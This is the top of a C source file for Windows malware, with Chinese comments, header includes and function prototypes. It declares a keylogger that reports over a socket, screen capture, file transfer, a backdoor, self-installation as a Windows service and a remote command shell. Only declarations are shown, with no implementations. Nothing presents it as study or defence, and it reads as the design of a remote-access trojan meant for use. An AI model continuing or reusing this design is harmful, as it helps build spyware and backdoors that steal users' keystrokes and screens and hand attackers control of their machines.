//service
#include<stdio.h> 
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")

//keylog
#include <windows.h>
#include <time.h>
#include <iostream> 
#include <string>
#include <fstream>
#define FILE_NAME "Record.log"
#define MIN_RECORD_SIZE 25
#include <conio.h>

//file
#include <stdlib.h> 
#include <string.h> 

//PtrSc
#include <math.h>
#include <wingdi.h>

//PtrSc
void echo(CHAR *str);
int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);//截图函数
void Capture(int num); //截图保存函数 
void PtrSc(int num); //调用截图函数

void logKey(SOCKET Socket);  //记录键盘 
char* decode(int); // 解密键码 
char* decodeCaps(int); //大写键码 
void logUserTime();  //时间戳 
bool checkRecordSize();  //检验文件的行数 
int KeyLog(SOCKET Socket); //键盘记录函数 

void sendFile(SOCKET m_New_Socket); //传送文件 
void recvFile(SOCKET m_New_Socket);  //接受文件
void BackDoor();//传输文件主函数 

void DelServices();  //删除服务函数 
int door();    //后门函数 
void Usage(void);  //提示信息 
void WINAPI EXEBackMain(LPVOID s);   //CMD函数 
void WINAPI ServiceCtrlHandler(DWORD Opcode);   //服务控制函数 
BOOL InstallCmdService();  //安装服务函数 
void WINAPI ServiceMain(DWORD, LPTSTR *);   //服务主函数 
DWORD WINAPI CmdService(LPVOID);  //CMD 
